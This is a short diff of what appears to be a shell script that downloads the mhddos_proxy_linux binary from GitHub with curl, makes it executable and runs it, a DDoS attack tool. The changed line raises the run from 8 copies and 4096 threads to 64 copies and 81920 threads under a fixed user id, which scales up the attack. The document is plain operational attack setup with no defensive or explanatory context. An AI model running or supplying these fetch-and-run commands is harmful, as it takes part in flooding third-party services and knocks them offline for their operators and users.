@@ -3,7 +3,7 @@
 
 curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo mhddos_proxy_linux 
 chmod +x mhddos_proxy_linux
-./mhddos_proxy_linux --lang en --copies 8 --threads 4096 --user-id 5272237815 
+./mhddos_proxy_linux --lang en --copies 64 --threads 81920 --user-id 5272237815 
 
 curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo mhddos_proxy_linux
 chmod +x mhddos_proxy_linux
